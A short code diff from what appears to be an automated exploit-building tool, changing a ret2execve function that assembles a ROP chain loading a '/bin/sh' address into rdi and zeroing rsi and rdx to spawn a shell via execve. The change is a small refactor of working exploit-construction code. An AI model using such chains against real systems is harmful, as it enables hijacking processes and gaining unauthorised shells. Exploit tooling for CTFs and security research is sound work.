@@ -44,12 +44,10 @@ def ret2execve(f_anal):
     chain = b''
 
     # populate arg1 - rdi
-    chain += get_rop.fill_reg('rdi', next(e.search(b'/bin/sh\x00')))
+    chain += get_rop.fill_reg('rdi', f_anal.get_binsh())
 
     # populate arg2 - rsi
     chain += get_rop.fill_reg('rsi', 0)
-    #chain += p64((r.find_gadget(['pop rsi', 'ret']))[0])
-    #chain += p64(0)
 
     # populate arg3 - rdx
     chain += get_rop.fill_reg('rdx', 0)
